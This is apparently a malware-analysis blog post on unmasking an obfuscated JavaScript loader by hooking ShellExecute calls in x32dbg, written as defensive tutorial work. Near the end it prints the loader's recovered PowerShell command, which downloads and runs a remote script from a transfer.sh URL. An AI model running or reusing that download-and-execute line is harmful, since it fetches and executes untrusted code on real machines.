Analysis of a JavaScript loader by hooking Windows API functions.

`Hash: a3937eb4681dc2a090360d9220c42ca25b51075542902a647839fe5f3c892097`

`Sample:  [Here](https://bazaar.abuse.ch/sample/a3937eb4681dc2a090360d9220c42ca25b51075542902a647839fe5f3c892097/#intel)`

***Overview***

Obfuscated JavaScript dropper which downloads the next stage for a Trojan. When trying to view the JavaScript, we can see that it is highly obfuscated.

![image](https://user-images.githubusercontent.com/95584654/159395273-2e779564-f2f4-4ab7-84b5-6b3368709c5e.png)

While we could try and figure out how to deobfuscate the loader, we can bypass this by hooking Windows API functions from shell32.dll.

We can use x32dbg to hook functions like ShellExecuteExW and or ShellExecuteExA to catch the loader before it executes any commands to reach out and download the next stage.

Review my other blog post [here](https://koi0x.github.io/Hooking-Windows-API-Functions-to-Analyze-JavaScript-VBScript-loaders/) for a reference.

***Debugging The Loader***

Firstly, we need to load wscript.exe into x32dbg. We need to do this because wscript.exe is the application that will act as the proxy between the JavaScript loader and the Windows API. You can find this in `C:\Windows\SysWOW64\wscript.exe`

Next, edit the command line to pass in the loader to be run with wscript.exe. Do this by going to `File -> Change Command Line`

Set a breakpoint on shell32.dll. We need to break when the DLL is loaded into memory so we can then set breakpoints on the imports.

![image](https://user-images.githubusercontent.com/95584654/159395305-f681217b-dbae-4c9f-89dd-73fa665030d9.png)

Now we need to set breakpoints on common function calls that are used to execute shell commands. Navigate to the symbols page and find shell32.dll and then search for ShellExecute. This will return all of the Windows API functions that will execute shell commands. Remember that we do not know what function is exactly being used in the loader. Given this, it is best practice to set breakpoints on all of them to have a fallback.

![image](https://user-images.githubusercontent.com/95584654/159395358-27c03409-731b-40e9-b1ec-cf89e11f831a.png)

Now with the breakpoint set, we can go ahead and continue the execution of the loader. At this point, we will hit a breakpoint on the function ShellExecuteExW.

![image](https://user-images.githubusercontent.com/95584654/159395404-7b326a99-5ce4-4366-9f7b-a4ffb7619322.png)

At this point, we can look at the current stack frame to see the parameters that are being passed into the ShellExecuteExW function. Reviewing the stack frame, we can see the loader is calling the following:

`Powershell.exe IEX(New-Object Net.Webclient).DownloadString('https://transfer.sh/get/kVRjSF/ttttyyyyyyy.ps1')`

![image](https://user-images.githubusercontent.com/95584654/159395443-ccd5d2c5-a97b-463c-90f4-6055c6be2620.png)

While I am not going to look further into this sample chain, I mainly wanted to write this as another example of my other blog post about hooking Windows API functions to analyze JavaScript and VBS loaders.
